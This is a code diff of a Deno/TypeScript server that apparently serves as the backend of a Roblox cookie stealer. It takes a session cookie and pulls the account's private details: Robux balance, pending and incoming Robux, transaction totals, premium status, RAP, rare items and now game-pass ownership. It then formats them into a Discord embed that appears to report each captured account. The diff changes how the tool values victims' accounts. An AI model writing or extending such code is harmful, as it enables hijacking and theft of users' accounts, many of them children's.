@@ -70,21 +70,22 @@ function loadEmoji(): Record<string, string> {
 const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
 const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman
 
-// Tracked games — values are Roblox PLACE IDs (resolved to universe IDs at runtime)
-const TRACKED_GAMES: Array<{ name: string; placeId: number }> = [
-  { name: "MM2", placeId: 142823291 },
-  { name: "Steal a Brainrot", placeId: 109983668079237 },
-  { name: "Adopt Me", placeId: 920587237 },
+// Tracked games — each lists the gamepass IDs we check ownership for.
+// "Owned passes" replaces the old played-games detection. Pass IDs are looked
+// up via the Roblox inventory `is-owned` endpoint.
+const TRACKED_GAMES: Array<{ name: string; passes: number[] }> = [
+  { name: "MM2",              passes: [429957, 1308795] },
+  { name: "Steal a Brainrot", passes: [1228591447, 1229510262, 1227013099] },
+  { name: "Adopt Me",         passes: [3196348, 5300198, 1585546290, 6040696, 189425850] },
 ];
 
-// Resolve a place ID to its universe ID via Roblox's apis endpoint
-async function placeToUniverse(placeId: number): Promise<number | null> {
+async function ownsGamePass(userId: number, gamePassId: number): Promise<boolean> {
   try {
-    const r = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`);
-    if (!r.ok) return null;
-    const j = await r.json() as { universeId?: number };
-    return j.universeId ?? null;
-  } catch { return null; }
+    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gamePassId}/is-owned`);
+    if (!r.ok) return false;
+    const text = (await r.text()).trim().toLowerCase();
+    return text === "true";
+  } catch { return false; }
 }
 
 Deno.serve(async (req) => {
@@ -300,7 +301,7 @@ interface RobloxInfo {
   summary: number | null;
   pendingRobux: number | null;
   incomingRobux: number | null;
-  playedGames: Array<{ name: string; played: boolean }>;
+  ownedPasses: Array<{ game: string; passes: Array<{ id: number; owned: boolean }> }>;
 }
 
 async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
@@ -312,7 +313,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, playedGames] = await Promise.all([
+    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
@@ -328,7 +329,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchVoiceEnabled(cookieHeader),
       fetchAgeVerified(cookieHeader),
       fetchTransactionTotals(auth.id, cookieHeader),
-      fetchPlayedGames(auth.id),
+      fetchOwnedPasses(auth.id),
     ]);
 
     const createdAt = profile?.created ?? null;
@@ -361,7 +362,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       summary: transactionTotals.summary,
       pendingRobux: transactionTotals.pending,
       incomingRobux: transactionTotals.incoming,
-      playedGames,
+      ownedPasses,
     };
   } catch (e) {
     console.error("roblox lookup failed", e);
@@ -369,74 +370,15 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
   }
 }
 
-// Detects whether the user has interacted with a tracked game.
-// Combined detection — uses MULTIPLE signals; "played" is true if ANY match:
-//   1. Game appears in the user's public favorites list
-//   2. Game appears in the user's "played"/recent games (apis.roblox.com)
-//   3. User owns at least one badge from the game's universe
-async function fetchPlayedGames(userId: number): Promise<Array<{ name: string; played: boolean }>> {
-  // Resolve all tracked place IDs to universe IDs in parallel
-  const resolved = await Promise.all(
-    TRACKED_GAMES.map(async (g) => ({
-      ...g,
-      universeId: await placeToUniverse(g.placeId),
-    })),
-  );
-
-  // Signal 1 — favorites
-  const favorites = new Set<number>();
-  try {
-    let cursor = "";
-    for (let page = 0; page < 5; page++) {
-      const url = `https://games.roblox.com/v2/users/${userId}/favorite/games?limit=50&sortOrder=Asc${cursor ? `&cursor=${cursor}` : ""}`;
-      const r = await fetch(url);
-      if (!r.ok) break;
-      const j = await r.json() as { data?: Array<{ id: number }>; nextPageCursor?: string };
-      for (const game of j.data ?? []) favorites.add(game.id);
-      if (!j.nextPageCursor) break;
-      cursor = j.nextPageCursor;
-    }
-  } catch { /* ignore */ }
-
-  // Signal 2 — created/played games via games.roblox.com (created games of user)
-  const userGames = new Set<number>();
-  try {
-    const r = await fetch(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=2&limit=50`);
-    if (r.ok) {
-      const j = await r.json() as { data?: Array<{ rootPlace?: { id: number }; id: number }> };
-      for (const g of j.data ?? []) {
-        if (g.rootPlace?.id) userGames.add(g.rootPlace.id);
-      }
-    }
-  } catch { /* ignore */ }
-
-  // Signal 3 — owns any badge from the universe
-  async function hasBadge(universeId: number): Promise<boolean> {
-    try {
-      const badgesRes = await fetch(
-        `https://badges.roblox.com/v1/universes/${universeId}/badges?limit=10&sortOrder=Asc`,
-      );
-      if (!badgesRes.ok) return false;
-      const badgesJson = await badgesRes.json() as { data?: Array<{ id: number }> };
-      const ids = (badgesJson.data ?? []).map((b) => b.id);
-      if (ids.length === 0) return false;
-      const ownedRes = await fetch(
-        `https://badges.roblox.com/v1/users/${userId}/badges/awarded-dates?badgeIds=${ids.join(",")}`,
-      );
-      if (!ownedRes.ok) return false;
-      const ownedJson = await ownedRes.json() as { data?: Array<unknown> };
-      return (ownedJson.data ?? []).length > 0;
-    } catch { return false; }
-  }
-
+// For each tracked game, check ownership of every listed gamepass in parallel.
+async function fetchOwnedPasses(userId: number): Promise<Array<{ game: string; passes: Array<{ id: number; owned: boolean }> }>> {
   return await Promise.all(
-    resolved.map(async ({ name, universeId, placeId }) => {
-      if (!universeId) return { name, played: false };
-      if (favorites.has(universeId)) return { name, played: true };
-      if (userGames.has(placeId)) return { name, played: true };
-      if (await hasBadge(universeId)) return { name, played: true };
-      return { name, played: false };
-    }),
+    TRACKED_GAMES.map(async (g) => ({
+      game: g.name,
+      passes: await Promise.all(
+        g.passes.map(async (id) => ({ id, owned: await ownsGamePass(userId, id) })),
+      ),
+    })),
   );
 }
 
@@ -736,7 +678,7 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.premium} Premium`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
       { name: `${EMOJI.rap} RAP`, value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
       { name: `${EMOJI.summary} Summary`, value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()}`, inline: true },
-      { name: `${EMOJI.pending} Robux Incoming/Outgoing`, value: `${(roblox.incomingRobux ?? 0).toLocaleString()}/${(roblox.robuxSpent ?? 0).toLocaleString()}`, inline: true },
+      { name: `${EMOJI.pending} Robux Incoming`, value: (roblox.incomingRobux ?? 0).toLocaleString(), inline: true },
       { name: `${EMOJI.korblox}/${EMOJI.headless} Korblox/Headless`, value: `${roblox.hasKorblox ? "True" : "False"}/${roblox.hasHeadless ? "True" : "False"}`, inline: true },
       { name: `${EMOJI.friends} Friends`, value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
       { name: `${EMOJI.followers} Followers`, value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
@@ -746,14 +688,16 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
     );
 
-    // Tracked games played
-    if (roblox.playedGames.length > 0) {
+    // Tracked game passes — one field per game, listing each pass ✅/❌
+    for (const g of roblox.ownedPasses) {
+      if (g.passes.length === 0) continue;
+      const ownedCount = g.passes.filter((p) => p.owned).length;
       mainFields.push({
-        name: `${EMOJI.games} Played Games`,
-        value: roblox.playedGames
-          .map((g) => `${g.played ? "✅" : "❌"} ${g.name}`)
+        name: `${EMOJI.games} ${g.game} Passes (${ownedCount}/${g.passes.length})`,
+        value: g.passes
+          .map((p) => `${p.owned ? "✅" : "❌"} [${p.id}](https://www.roblox.com/game-pass/${p.id})`)
           .join("\n"),
-        inline: false,
+        inline: true,
       });
     }
 
